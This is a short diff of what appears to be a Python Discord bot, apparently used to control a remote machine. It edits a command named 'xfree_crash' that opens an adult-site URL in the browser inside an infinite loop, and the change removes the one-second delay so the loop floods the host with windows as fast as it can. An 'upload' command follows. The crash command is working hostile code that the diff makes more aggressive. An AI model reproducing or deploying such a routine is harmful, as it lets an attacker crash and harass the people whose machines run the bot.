@@ -259,9 +259,8 @@ async def xfree_crash(ctx):
     try:
         while True:
             webbrowser.open("https://xfree.com")
-            await asyncio.sleep(1)
     except Exception as e:
-        await ctx.send(f"Error opening xfree.com: {e}")
+        await ctx.send(f"Error opening xfree: {e}")
 
 @bot.command(name='upload')
 async def upload_file(ctx):
